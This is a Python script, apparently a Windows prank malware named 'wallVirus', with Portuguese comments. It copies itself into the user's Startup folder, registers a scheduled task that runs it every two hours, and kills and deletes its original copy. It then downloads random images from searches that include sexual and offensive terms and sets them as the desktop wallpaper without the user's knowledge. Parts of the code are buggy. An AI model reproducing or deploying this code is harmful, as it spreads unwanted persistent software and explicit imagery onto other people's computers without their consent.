# coding=utf-8
from ctypes import windll
from random import choice
from time import sleep
from google_images_download import google_images_download 
from getpass import getuser
from os.path import join
import os
import sys
import subprocess



#queries para serem pesquisadas
search_queries = [     
'bolsonaro heroi',
'bolsonaro otaku',
'naked shrek',
'ahegao',
'ahegao shrek',
'anime body pillow',
'yaoi',
'ecchi',
'never gonna give you up',
'ricardo milos',
'ricardo milos ass',
'naruto and sasuke love',
'naruto and sasuke yaoi',
'steve and bucky love',
'tobey maguire memes',
'joker dancing',
'donald trump meme'
] 


if(sys.getfilesystemencoding() == 'utf-8'):
	setImageAsBackground = lambda image: windll.user32.SystemParametersInfoW(20, 0, image , 0)
else:
	setImageAsBackground = lambda image: windll.user32.SystemParametersInfoA(20, 0, image , 0)

def GetImg(query_img, outdir, silent = False):
	google = google_images_download.googleimagesdownload()
	
	config_params = {
					"keywords": query_img, 
					"format": 'jpg', #talvez tirar isso
	                "limit": 1, 
	                "print_urls":False, 
	                "size": "medium", 
	                "aspect_ratio": 'panoramic',
	                "output_directory": outdir,
	                "silent_mode": silent,
	                "no_numbering": True,
	                "no_directory": True
	                } 
	tries = 10
	while(tries):
		path = google.download(config_params)
		try:
			path[0][query_img][0]
		except:
			tries-=1
		else:
			return path[0][query_img][0]

	#print(paths[0][query_img][0])
	return None

#montando path para o diretorio de startup do windows
def getStartupDir():
	root_path = "C:\\Users"
	user = getuser()
	startup_path = "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	return join(root_path,user,startup_path)

def copyItself(filename,newfilename,curdir, outdir):
	#ler proprio conteudo
	self_file = open(join(curdir,filename),'rb')
	content = self_file.read()
	self_file.close()
	
	#mudando diretorio de trabalho para o diretorio de startup
	os.chdir(outdir)

	#copiando conteudo para novo arquivo
	new_file = open(join(outdir,newfilename),'wb')
	new_file.write(content)
	new_file.close()

	#retorna diretorio original
	os.chdir(curdir)

def setSchedule(sch_name, filemane, app_path):
	sch_create = 'SCHTASKS /CREATE /SC HOURLY /MO 2 /TN ' + sch_name + ' /TR "' + join(app_path,filename) +'" /f'
	subprocess.call(sch_create)


	# sch_list = 'SCHTASKS /QUERY'
	#vefiricar se agendamento ja existe
	# responde = subprocess.check_output(sch_list)
	# if(responde.decode('ISO-8859-1').find(sch_name) == -1):
	# 	#se nao existe criar-lo



filename = sys.argv[0].split('\\')[-1]
dotWhat = '.py' if filename.find('.py') else '.exe'
oldfilename = 'wallVirus'+dotWhat
newfilename = 'wall'+dotWhat

startup_full_path = getStartupDir()

current_dir = os.getcwd()

if(len(sys.argv)>1):
		kill_cmd = 'taskkill /f /im {}'.format(oldfilename)
		subprocess.call(kill_cmd)
		os.chdir(sys.argv[1])
		os.remove(oldfilename)
		print('deletado')


if(current_dir != startup_full_path):
	copyItself(oldfilename,newfilename, current_dir, startup_full_path)
	setSchedule(filename,filename,startup_full_path)

	Dotpy = 'python' if filename.find('.py') else ''

	run_cmd = '{0} {1} {2}'.format(Dotpy, newfilename, current_dir)
	print('run_cmd: ',run_cmd)
	os.chdir(startup_full_path)
	subprocess.call(run_cmd)

else:
	img_path = GetImg(choice(search_queries), startup_full_path,silent = True)

	if(img_path):
		setImageAsBackground(img_path)
		sleep(2)
		os.remove(img_path)
